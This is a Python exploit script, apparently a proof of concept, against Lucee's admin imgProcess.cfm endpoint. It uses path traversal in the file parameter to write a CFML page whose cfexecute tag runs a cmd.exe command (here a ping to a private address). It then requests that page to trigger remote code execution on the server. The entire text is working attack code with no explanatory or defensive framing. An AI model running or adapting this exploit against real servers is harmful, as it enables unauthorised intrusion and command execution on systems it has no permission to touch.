import string
import random
import argparse
import requests
import urllib3
#Disable insecure https warnings (for self-signed SSL certificates)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ap = argparse.ArgumentParser()
ap.add_argument("-t", "--target", default="http://localhost:8888")
args = ap.parse_args()
base_url = args.target.rstrip("/")
def random_string():
    return "".join(random.choices(string.ascii_lowercase, k=12))
payload = f"""\
<cfset args="/c ping 192.168.6.133">
<cfoutput>
<cfexecute
    name="cmd.exe"
    arguments="#preservesinglequotes(args)#"
    timeout="2">
</cfexecute>
</cfoutput>
"""
with requests.Session() as session:
    img_process_url = f"{base_url}/lucee/admin/imgProcess.cfm"
    response = session.get(img_process_url)
    if response.ok:
        print(f"[-] Target most likely not vulnerable.")
        exit()
    filename = random_string() + ".cfm"
    print(filename)
    print(f"[*] Writing payload...")
    session.post(f"{img_process_url}?file=_/" + random_string(), data={"imgSrc": random_string()})
    session.post(f"{img_process_url}?file=_/../../../context/{filename}", data={"imgSrc": payload})
    try:
        print("[*] Triggering shell...")
        session.get(f"{base_url}/lucee/{filename}", timeout=2)
    except requests.ReadTimeout:
        pass




